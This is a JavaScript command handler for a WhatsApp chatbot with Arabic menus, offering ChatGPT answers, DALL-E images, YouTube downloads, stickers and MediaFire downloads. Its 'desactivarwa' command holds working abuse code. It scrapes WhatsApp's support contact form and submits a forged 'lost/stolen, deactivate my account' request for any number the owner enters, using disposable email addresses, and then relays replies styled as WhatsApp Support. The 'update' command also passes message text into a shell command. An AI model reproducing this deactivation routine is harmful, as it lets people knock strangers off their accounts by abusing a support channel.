"use strict";
process.on('uncaughtException', console.error)
const { downloadContentFromMessage, downloadMediaMessage } = require("@adiwajshing/baileys");
const { color, bgcolor } = require("../lib/color");
const fetch = require("node-fetch");
const fs = require("fs");
const moment = require("moment-timezone");
const util = require("util");
const { exec, spawn, execSync } = require("child_process");
let setting;
const { ownerNumber, MAX_TOKEN, OPENAI_KEY } = setting = require('../config.json');
const speed = require("performance-now");
let { ytv } = require('../lib/y2mate')
const ffmpeg = require("fluent-ffmpeg");
let { ytmp4, ytmp3, ytplay, ytplayvid } = require('../lib/youtube')
const { mediafireDl } = require('../lib/myfunc')
const axios = require("axios");
const cheerio = require("cheerio");

moment.tz.setDefault("Asia/Jakarta").locale("id");

module.exports = async (conn, msg, m, openai) => {
  try {
    if (msg.key.fromMe) return
    const { type, isQuotedMsg, quotedMsg, mentioned, now, fromMe } = msg;
    const toJSON = (j) => JSON.stringify(j, null, "\t");
    const from = msg.key.remoteJid;
    const chats = type === "conversation" && msg.message.conversation ? msg.message.conversation : type === "imageMessage" && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : type === "videoMessage" && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : type === "extendedTextMessage" && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : type === "buttonsResponseMessage" && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : type === "templateButtonReplyMessage" && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : type === "messageContextInfo" ? msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId : type == "listResponseMessage" && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : "";
    const args = chats.split(" ");
    const prefix = /^[°•π÷×¶∆£¢€¥®™✓=|~+×_*!#%^&./\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓=|~+×_*!#,|÷?;:%^&./\\©^]/gi) : null;
    const command = prefix ? chats.slice(1).trim().split(' ').shift().toLowerCase() : ''
    const isGroup = msg.key.remoteJid.endsWith("@g.us");
    const groupMetadata = msg.isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
    const groupName = msg.isGroup ? groupMetadata.subject : ''  
    const sender = isGroup ? msg.key.participant ? msg.key.participant : msg.participant : msg.key.remoteJid;
    const userId = sender.split("@")[0]
    const botNumber = conn.user.id.split(":")[0] + "@s.whatsapp.net";
    const isOwner = [botNumber,...ownerNumber].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(sender)
    const pushname = msg.pushName;
    const q = chats.slice(command.length + 1, chats.length);
    const isCmd = chats.startsWith(prefix)
    const content = JSON.stringify(msg.message)
    const isImage = (type == 'imageMessage')
    const isVideo = (type == 'videoMessage')
    const isAudio = (type == 'audioMessage')
    const isSticker = (type == 'stickerMessage')
    const isViewOnce = (type == 'viewOnceMessageV2')
    const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false    
    const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
    const textolink = decodeURIComponent(chats.replace(command, '').replace(prefix, '').split(' ').join(''))  
    const textosinespacio = decodeURIComponent(chats.replace(command, '').replace(prefix, ''))
 
/* Envios de mensajes */ 
    
const reply = (teks) => {
conn.sendMessage(from, { text: teks }, { quoted: msg });
};
const tempButton = async (remoteJid, text, footer, content) => {
const templateMessage = { viewOnceMessage: { message: { templateMessage: { hydratedTemplate: { hydratedContentText: text, hydratedContentFooter: footer, hydratedButtons: content, }, }, }, }, };
const sendMsg = await conn.relayMessage(remoteJid, templateMessage, {}); 
};
const sendAud = (link) => { 
conn.sendMessage(from, { audio: { url: link }, fileName: `error.mp3`, mimetype: 'audio/mp4' }, { quoted: msg });
};
const sendVid = (link, thumbnail) => {
conn.sendMessage( from, { video: { url: link }, fileName: `error.mp4`, thumbnail: thumbnail, mimetype: 'video/mp4' }, { quoted: msg });
};      
const sendImgUrl = (link) => {
conn.sendMessage( from, { image: { url: link }, fileName: `error.jpg` }, { quoted: msg });
};         
      
/* Auto Read & Presence Online */
conn.readMessages([msg.key]);
conn.sendPresenceUpdate("available", from);

    // Logs;
    if (!isGroup && isCmd && !fromMe) {
      console.log("->[\x1b[1;32mCMD\x1b[1;37m]", color(moment(msg.messageTimestamp * 1000).format("DD/MM/YYYY HH:mm:ss"), "yellow"), color(`${command} [${args.length}]`), "from", color(pushname));
    }
    if (isGroup && isCmd && !fromMe) {
      console.log("->[\x1b[1;32mCMD\x1b[1;37m]", color(moment(msg.messageTimestamp * 1000).format("DD/MM/YYYY HH:mm:ss"), "yellow"), color(`${command} [${args.length}]`), "from", color(pushname), "in", color(groupName));
    }

switch (command) {
case 'start': case 'menu':
var textReply = `👋 مرحبًا 👋

أنا روبوت WhatsApp يستخدم الذكاء الاصطناعي OpenAI (ChatGPT) ، لقد تم إنشاؤه للإجابة على أسئلتك. أرسل لي سؤالاً وسأجيب عليك!

_الروبوت مقصور على إجابة ${MAX_TOKEN} كلمة كحد أقصى_

الأوامر المتوفرة:
- ${prefix}start
- ${prefix}ping
- ${prefix}runtime
- ${prefix}play
- ${prefix}play2
- ${prefix}ytmp3
- ${prefix}ytmp4
- ${prefix}chatgpt
- ${prefix}dall-e
- ${prefix}sticker
- ${prefix}mediafiredl

أوامر المطور:
- ${prefix}update
- ${prefix}desactivarwa

*Created By L3FIT*`
var templateButtons = [
{index: 1, urlButton: {displayText: '𝙾𝚆𝙽𝙴𝚁 👑', url: 'https://wa.me/212679713244'}},
{index: 2, urlButton: {displayText: '𝕀ℕ𝕊𝕋𝔸𝔾ℝ𝔸𝕄🔗', url: 'https://instagram.com/dolipran_009'}}]
let templateMessage = { image: {url: 'https://www.mizanurrmizan.info/wp-content/uploads/2023/02/chatgpt.jpg'}, caption: textReply, footer: null, templateButtons: templateButtons, viewOnce: true };
conn.sendMessage(from, templateMessage, { quoted: msg });
break
case 'runtime':
reply(require('../lib/myfunc').runtime(process.uptime()))
break
case 'ping':
var timestamp = speed();
var latensi = speed() - timestamp
reply(`*وقت الاستجابة: ${latensi.toFixed(4)}s*`)
break     
case 'play':
if (!args[1]) return reply(`*[❗] اسم الأغنية مفقود ، الرجاء إدخال الأمر بالإضافة إلى اسم أو عنوان أو رابط أي أغنية أو مقطع فيديو على YouTube*\n\n*—◉ مثال:*\n*◉ ${prefix + command} İllegal Life*`)        
let res = await fetch(`https://api.lolhuman.xyz/api/ytplay2?apikey=BrunoSobrino&query=${textosinespacio}`) 
let json = await res.json()
let kingcore = await ytplay(textosinespacio)
let audiodownload = json.result.audio
if (!audiodownload) audiodownload = kingcore.result
sendAud(`${audiodownload}`)
break
case 'play2':
if (!args[1]) return reply(`*[❗] اسم الأغنية مفقود ، الرجاء إدخال الأمر بالإضافة إلى اسم أو عنوان أو رابط أي أغنية أو مقطع فيديو على YouTube*\n\n*—◉ مثال:*\n*◉ ${prefix + command} İllegal Life*`)        
let mediaa = await ytplayvid(textosinespacio)
sendVid(mediaa.result, `${mediaa.thumb}`)
break   
case 'ytmp3':
if (!args[1]) return reply(`*[❗] أدخل رابط فيديو يوتيوب*\n\n*—◉ مثال:*\n*◉ ${prefix + command}* https://youtu.be/uTR_gHC1__E`)    
let ress22 = await fetch(`https://api.lolhuman.xyz/api/ytaudio2?apikey=BrunoSobrino&url=${textolink}`) 
let jsonn22 = await ress22.json()
let kingcoreee2 = await ytmp3(textolink)
let audiodownloaddd2 = jsonn22.result.link
if (!audiodownloaddd2) audiodownloaddd2 = kingcoreee2.result
sendAud(`${audiodownloaddd2}`)    
break        
case 'ytmp4':
if (!args[1]) return reply(`*[❗] Iأدخل رابط فيديو يوتيوب\n\n*—◉ مثال:*\n*◉ ${prefix + command}* https://youtu.be/WEdvakuztPc`)    
let ress2 = await fetch(`https://api.lolhuman.xyz/api/ytvideo?apikey=BrunoSobrino&url=${textolink}`) 
let jsonn2 = await ress2.json()
let kingcoreee = await ytmp4(textolink)
let videodownloaddd = jsonn2.result.link.link
if (!videodownloaddd) videodownloaddd = kingcoreee.result
sendVid(videodownloaddd, `${kingcoreee.thumb}`)    
break    
case 'dall-e': case 'draw': 
if (!args[1]) return reply(`*[❗] أدخل نصًا سيكون موضوع الصورة ، وبالتالي استخدم وظيفة AI Dall-E*\n\n*—◉ أمثلة على الطلبات:*\n*◉ ${prefix + command} CAT WITH WHEELS*\n*◉ ${prefix + command} Amazigh Woman*`)    
try {       
const responsee = await openai.createImage({ prompt: textosinespacio, n: 1, size: "1024x1024", });    
sendImgUrl(responsee.data.data[0].url)        
} catch (jj) {
reply("*[❗] خطأ في الخادم 1 ، ستتم تجربة خادم آخر ...*\n\n*—◉ خطأ:*\n" + jj)       
try {      
sendImgUrl(`https://api.lolhuman.xyz/api/dall-e?apikey=BrunoSobrino&text=${textosinespacio}`)  
} catch (jj2) {
reply("*[❗] خطأ في الخادم 2 ، لم يتم الحصول على صورة AI...*\n\n*—◉ خطأ:*\n" + jj2)        
}}
break
case 'chatgpt': case 'ia': 
if (!args[1]) return reply(`*[❗] أدخل طلبًا لاستخدام ميزة ChatGPT*\n\n*—◉ أمثلة على الطلبات والأوامر:*\n*◉ ${prefix + command} أعطني عرضًا تقديميًا عن الروبوتات ضد الإنسان*\n*◉ ${prefix + command} كود JS للعبة الورق*`)           
try {
const BotIA = await openai.createCompletion({ model: "text-davinci-003", prompt: textosinespacio, temperature: 0.3, max_tokens: MAX_TOKEN, stop: ["Ai:", "Human:"], top_p: 1, frequency_penalty: 0.2, presence_penalty: 0, })
reply(BotIA.data.choices[0].text.trim())
} catch (qe) {
reply("*[❗] خطأ في الخادم 1 ، ستتم تجربة خادم آخر...*\n\n*—◉ آخر:*\n" + qe)       
try {    
let tioress = await fetch(`https://api.lolhuman.xyz/api/openai?apikey=BrunoSobrino&text=${textosinespacio}&user=user-unique-id`)
let hasill = await tioress.json()
reply(`${hasill.result}`.trim())   
} catch (qqe) {        
reply("*[❗] Eخطأ الخادم 2 ، لم يتلق أي ردود من AI..*\n\n*—◉ خطأ:*\n" + qqe)  
}} 
break
case 'update':
if (!isOwner) return reply('*[❗] لا يمكن استخدام هذا الأمر إلا من قبل مالك الروبوت*')    
try {    
let stdout = execSync('git pull' + (m.fromMe && q ? ' ' + q : ''))
await reply(stdout.toString()) 
} catch { 
let updatee = execSync('git remote set-url origin https://github.com/BrunoSobrino/openai-botwa.git && git pull')
await reply(updatee.toString())}  
break
case 'desactivarwa':      
if (!isOwner) return reply('*[❗] لا يمكن استخدام هذا الأمر إلا من قبل مالك الروبوت*')    
if (!q || !args[1]) return reply(`*[❗] أدخل رقمًا ، مثال ${prefix + command} +1 (450) 999-999*`)
let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let ressss = await axios({ url, method: "POST", data: form, headers: { cookie } })
var payload = String(ressss.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##\n\nمرحبا،\n\nشكرا لرسالتك.\n\nلقد قمنا بإلغاء تنشيط حساب WhatsApp الخاص بك. هذا يعني أن حسابك معطل مؤقتًا وسيتم حذفه تلقائيًا في غضون 30 يومًا إذا لم تقم بإعادة تسجيل الحساب. يرجى ملاحظة: لا يمكن لدعم عملاء WhatsApp حذف حسابك يدويًا.\n\nخلال فترة الإغلاق:\n • قد تستمر جهات اتصالك على WhatsApp في رؤية اسمك وصورة ملفك الشخصي.\n • ستبقى أي رسائل يمكن لجهات الاتصال الخاصة بك إرسالها إلى الحساب في حالة انتظار لمدة تصل إلى 30 يومًا.\n\nإذا كنت ترغب في استعادة حسابك ، يرجى إعادة تسجيل حسابك في أقرب وقت ممكن.\nأعد تسجيل حسابك بإدخال الرمز المكون من 6 أرقام ، الرمز الذي تتلقاه عبر رسالة نصية قصيرة أو مكالمة هاتفية. إذا قمت بإعادة التسجيل\n\nإذا كانت لديك أية أسئلة أو استفسارات أخرى ، فلا تتردد في الاتصال بنا. سنكون سعداء للمساعدة!`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##\n\nمرحبا:\n\nشكرا لرسالتك.\n\nلمتابعة طلبك ، نحتاج منك التحقق من أن رقم الهاتف هذا يخصك. يُرجى إرسال الوثائق التي تسمح لنا بالتحقق من أن الرقم ملك لك ، مثل نسخة من فاتورة الهاتف أو عقد الخدمة.\n\nيرجى التأكد من إدخال رقم هاتفك بالتنسيق الدولي الكامل. لمزيد من المعلومات حول التنسيق الدولي ، راجع هذه المقالة.\n\إذا كانت لديك أية أسئلة أو استفسارات أخرى ، فلا تتردد في الاتصال بنا. سنكون سعداء لمساعدتك.`)
} else reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
break   
case 'mediafiredl':
let resss2 = await mediafireDl(textosinespacio)
let caption = `
*📓 اسم:* ${resss2.name}
*📁 وزن:* ${resss2.size}
*📄 رجل:* ${resss2.mime}\n
*⏳ انتظر حتى أرسل ملفك. . . .* 
`.trim()
await reply(caption)
await conn.sendMessage(from, { document : { url: resss2.link }, fileName: resss2.name, mimetype: resss2.mime.toUpperCase() }, { quoted: msg })       
break
case 'sticker': case 's':
try {        
const pname = 'OpenAI - WaBot'
const athor = '+' + conn.user.id.split(":")[0];
if (isImage || isQuotedImage) {
await conn.downloadAndSaveMediaMessage(msg, "image", `./tmp/${sender.split("@")[0]}.jpeg`)
var media = fs.readFileSync(`./tmp/${sender.split("@")[0]}.jpeg`)
var opt = { packname: pname, author: athor }
conn.sendImageAsSticker(from, media, msg, opt)
fs.unlinkSync(`./tmp/${sender.split("@")[0]}.jpeg`)
} else {
if(isVideo || isQuotedVideo) {
var media = await conn.downloadAndSaveMediaMessage(msg, 'video', `./tmp/${sender}.jpeg`)
var opt = { packname: pname, author: athor }
conn.sendImageAsSticker(from, media, msg, opt)
fs.unlinkSync(media)
} else {
const imageBuffer = await downloadMediaMessage(msg, 'buffer', {}, {});
let filenameJpg = "stk.jpg";
fs.writeFileSync(filenameJpg, imageBuffer);
await ffmpeg('./' + filenameJpg).input(filenameJpg).on('start', function(cmd){
console.log(`Started: ${cmd}`)
}).on('error', function(err) {
console.log(`خطأ: ${err}`);
reply('error')}).on('end', async function() {
console.log('Finish')
await conn.sendMessage(from, {sticker: {url:'stk.webp'}})
}).addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`]).toFormat('webp').save('stk.webp');
}}} catch {     
reply(`*[❗] قم بالرد على صورة أو gif أو مقطع فيديو ، والذي سيتم تحويله إلى ملصق ، تذكر أنه يجب عليك إرسال صورة أو الرد على صورة بالأمر ${prefix + command}*`)        
}
break 
default:
const botNumber22 = '@' + conn.user.id.split(":")[0];
if (!chats.startsWith(botNumber22) && isGroup) return
if (isImage || isVideo || isSticker || isViewOnce || isAudio) return
let chatstext = chats.replace(conn.user.id.split(":")[0].split("@")[0], '')
if (isGroup) chatstext = chatstext.replace("@", '').replace(prefix, '')
console.log("->[\x1b[1;32mNew\x1b[1;37m]", color('Pregunta De', 'yellow'), color(pushname, 'lightblue'), `: "${chatstext}"`)
conn.sendPresenceUpdate("composing", from);
try {
const response = await openai.createCompletion({ model: "text-davinci-003", prompt: chatstext, temperature: 0.3, max_tokens: MAX_TOKEN, stop: ["Ai:", "Human:"], top_p: 1, frequency_penalty: 0.2, presence_penalty: 0, })
reply(response.data.choices[0].text.trim())
} catch (eee) {
reply("*[❗] Error en el servidor 1, se intentará con otro servidor...*\n\n*—◉ خطأ:*\n" + eee)       
try {    
let tiores = await fetch(`https://api.lolhuman.xyz/api/openai?apikey=BrunoSobrino&text=${chatstext}&user=user-unique-id`)
let hasil = await tiores.json()
reply(`${hasil.result}`.trim())   
} catch (eeee) {        
reply("*[❗] خطأ في الخادم 2 ، لا توجد ردود من الذكاء الاصطناعي...*\n\n*—◉ خطأ:*\n" + eeee)  
}} 
break
}} catch (err) {
console.log(color("[ERROR]", "red"), err); }};
